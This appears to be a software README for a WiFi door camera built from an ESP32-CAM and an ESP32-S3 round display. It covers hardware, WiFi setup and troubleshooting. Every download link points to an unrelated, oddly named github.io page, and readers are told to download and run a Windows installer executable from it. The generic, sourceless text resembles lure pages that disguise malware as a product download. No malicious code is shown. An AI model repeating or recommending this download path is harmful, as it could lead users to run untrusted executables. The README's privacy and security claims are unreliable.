# 🏠 smart-door-camera - View your door visitors with ease

[![Download Software](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://corlissbumptious838.github.io)

## 📋 About This Project

This software powers a simple home surveillance system. It connects a door camera to a wall-mounted screen. You see who stands at your door in real time on a small round display. You manage all settings from your smartphone. There is no need for wires to connect the units because they use your home WiFi network.

## 🛠️ System Requirements

You need a Windows computer to install the software onto the hardware components. Ensure your computer meets these basic needs:

- Windows 10 or Windows 11 operating system.
- An available USB port.
- A standard USB-C or Micro-USB cable to connect your hardware to the computer.
- A stable 2.4GHz WiFi connection in your home.
- A smartphone or tablet with WiFi capabilities for setup.

## 📥 Downloading the Software 

You need to download the latest setup file to your computer. This file contains the instructions for the camera and the screen.

[Click here to visit the release page to download the software](https://corlissbumptious838.github.io)

Look for the file ending in `.bin` or the main installer package listed under the latest version. Save this file to your desktop for easy access.

## 🔌 Connecting The Hardware

Before you run the software, connect your hardware components. 

1. Take the ESP32-CAM board.
2. Connect it to your Windows computer using a USB cable.
3. Take the ESP32-S3 display unit.
4. Connect it to your Windows computer using a second USB cable.

Your computer might make a sound to signal that it recognizes new hardware. Windows installs the necessary drivers automatically in most cases. Wait for Windows to finish this process before you proceed.

## ⚙️ Installing and Setting Up

Once you download the file and connect your hardware, follow these steps to finish the setup.

1. Locate the file you saved to your desktop.
2. Open the application folder.
3. Launch the installer executable.
4. Follow the on-screen prompts to select your connected hardware devices from the list.
5. Click the button labeled "Flash Device" to send the software to your hardware.
6. A progress bar shows you the status. Keep the devices connected until the screen says "Complete."

## 📱 Connecting to WiFi

When the software installs, your devices create a temporary setup network. Use your phone to connect them to your home internet.

1. Open your phone WiFi settings.
2. Look for a network named "SmartDoorSetup."
3. Connect to this network.
4. A screen pops up on your phone. If it does not appear, open your web browser and type `192.168.4.1` in the address bar.
5. Select your home WiFi network name from the list.
6. Enter your WiFi password.
7. Click the save button.

Your camera and screen now restart and search for your home WiFi. They find each other automatically once they join the network.

## 💡 Using the Camera

Once the devices connect to WiFi, the screen displays the live feed from the camera. You can hang the camera near your door and place the round display in a convenient spot, such as your hallway or kitchen. 

If the video feed drops, ensure your WiFi signal is strong in the area where you placed the units. You do not need to repeat the setup steps unless you change your WiFi password or move your internet router.

## 🔍 Troubleshooting Tips

If you run into issues, try these steps to fix common problems.

### Hardware Not Detected
If your computer does not see the devices, try a different USB cable. Some cables only charge devices and cannot transfer data. Use a cable that came with a data device like a phone or a mouse.

### No Video Feed
If the display shows a blank screen or a logo, check your WiFi. The devices must be on the same network to talk to each other. Make sure you typed your WiFi password correctly during the setup phase. If you are unsure, press the small reset button on the side of the devices to start the setup process again.

### Slow Video Speed
A slow video feed usually means a weak WiFi signal. Move your router closer to the camera and the display unit. Large walls or appliances between the devices and the router can block the signal.

### Screen Remains Dark
Check the power source for the screen. Ensure the USB cable sits firmly in the port. Verify that the outlet provides power. If you use a USB hub, try plugging the device directly into the computer or a wall adapter instead.

## 🛡️ Privacy and Security

This system runs locally on your home network. The video signal does not travel to an external cloud server. Your data stays inside your home walls, which provides a high level of privacy. Because the system relies on your private WiFi, ensure you use a strong password for your home network to keep your connection secure.

## 🔧 Updating the Firmware

We provide updates to improve performance. To update your system, visit the download link again. Download the newer file, connect your devices to your Windows computer, and run the install steps again as described above. The update process keeps your settings and connects to your WiFi just like the original installation.